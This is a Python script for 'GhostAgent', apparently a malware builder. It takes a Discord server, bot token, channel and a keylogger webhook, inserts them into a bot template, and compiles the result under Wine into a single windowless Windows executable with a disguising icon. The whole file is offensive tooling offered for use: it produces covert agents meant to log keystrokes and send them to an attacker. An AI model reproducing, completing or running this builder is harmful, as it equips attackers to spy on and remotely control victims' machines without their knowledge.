import json
import subprocess
import os
import argparse
import distro
from prettytable import PrettyTable
from sys import platform as OS
import requests
import time
import sys
import logging

# Set up logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

def clear_screen():
    if OS == "linux" or OS == "linux2":
        os.system("clear")
    elif OS == "win32":
        os.system("cls")

clear_screen()

def logo():
    print('''
    ________.__                    __     _____                         __   
    /  _____/|  |__   ____  _______/  |_  /  _  \    ____   ____   _____/  |_ 
    /   \  ___|  |  \ /  _ \/  ___/\   __\/  /_\  \  / ___\_/ __ \ /    \   __|
    \    \_\  \   Y  (  <_> )___ \  |  | /    |    \/ /_/  >  ___/|   |  \  |  
    \______  /___|  /\____/____  > |__| \____|__  /\___  / \___  >___|  /__|  
            \/     \/           \/               \//_____/      \/     \/      
        ''')
logo()

# Default settings list
list = ["None", "None", "None", "None", "None"]

# Load configuration from JSON
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        logger.error("Config file 'config.json' not found.")
        sys.exit(1)
    except json.JSONDecodeError:
        logger.error("Error decoding JSON from 'config.json'.")
        sys.exit(1)

config = load_config()

# Create a settings table for display
def create_table(config_list):
    table = PrettyTable(["Config", "Value"])
    table.add_row(["Name", config_list[0]])
    table.add_row(["Server", config_list[1]])
    table.add_row(["Token", config_list[2]])
    table.add_row(["Channel", config_list[3]])
    table.add_row(["Webhook", config_list[4]])
    return table

# Create help menu
def create_help_menu():
    menu = PrettyTable(["Command", "Description"])
    menu.add_row(["set config + value", "Set Config + Value"])
    menu.add_row(["custom config", "Custom Config + Value Settings"])
    menu.add_row(["config", "Config + Value Settings"])
    menu.add_row(["build", "Build the Agent"])
    menu.add_row(["exit", "Quit GhostAgent"])
    return menu

try:
    while True:
        command = input(f"[*] Console: ")
        command_list = command.split()

        # Skip empty commands
        if not command_list:
            continue

        # Exit command
        if command_list[0] == "exit":
            logger.info("Exiting program.")
            print("\n[*] Console: Quitting...")
            exit()

        # Set command
        elif command_list[0] == "set":
            if len(command_list) < 3:
                print("[*] Console: [Invalid Config] - Missing value.\n")
                logger.warning("Invalid 'set' command. Not enough arguments.")
            else:
                setting = command_list[1]
                value = command_list[2]

                if setting == "name":
                    list[0] = value
                elif setting == "server":
                    list[1] = value
                elif setting == "token":
                    list[2] = value
                elif setting == "channel":
                    list[3] = value
                elif setting == "webhook":
                    list[4] = value
                elif setting == "custom":
                    list[0] = config["name"]
                    list[1] = config["server"]
                    list[2] = config["token"]
                    list[3] = config["channel"]
                    list[4] = config["webhook"]
                    logger.info("Applied custom config settings.")
                else:
                    print("[*] Console: [Invalid Command]")
                    logger.warning(f"Invalid command: {command_list[1]}")

        # Display current configuration
        elif command_list[0] == "config":
            clear_screen()
            logo()
            table = create_table(list)
            print(f"\n{table.get_string(title='GhostAgent Settings')}")

        # Clear the screen
        elif command_list[0] == "clear":
            clear_screen()
            logo()

        # Help menu
        elif command_list[0] == "help":
            clear_screen()
            logo()
            if len(command_list) == 1:
                menu = create_help_menu()
                print(menu)
            else:
                logger.info(f"Help requested for command: {command_list[1]}")
                if command_list[1] in ["build", "update", "exit", "config", "clear"]:
                    print("[*] Command: [Null]")
                else:
                    print("[*] Console: [Invalid Command]")

        # Build command
        elif command_list[0] == "build":
            clear_screen()
            logo()
            print('\n[+] Building: [Started]\n')

            try:
                with open("code/discord/bot.py", 'r') as f:
                    file = f.read()

                newfile = file.replace("{GUILD}", str(list[1]))
                newfile = newfile.replace("{TOKEN}", str(list[2]))
                newfile = newfile.replace("{CHANNEL}", str(list[3]))
                newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(list[4]))

                with open(f"{list[0]}.py", 'w') as f:
                    f.write(newfile)

                logger.info(f"Generated {list[0]}.py for building.")

                # Path to pyinstaller
                path_to_pyinstaller = None
                if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe'):
                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
                else:
                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')

                if "Arch" in distro.name() or "Manjaro" in distro.name():
                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')

                compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", f"{list[0]}.py"]

                subprocess.call(compile_command)

                # Clean up
                try:
                    os.remove(f"{list[0]}.py")
                    os.remove(f"{list[0]}.spec")
                except FileNotFoundError:
                    pass

                logger.info("Build finished.")
                print('\n[+] Building: [Finished]')
                print('[+] Location: [/dist].')

            except FileNotFoundError as e:
                logger.error(f"File not found: {e}")
                print(f"[!] Error: {e}")
            except Exception as e:
                logger.error(f"An unexpected error occurred: {e}")
                print(f"[!] Error: {e}")

        # Invalid command handler
        else:
            logger.warning(f"Unknown command: {command_list[0]}")
            print("[*] Console: [Invalid Command]")

except KeyboardInterrupt:
    logger.info("Exiting program due to KeyboardInterrupt.")
    print("[+] Exiting")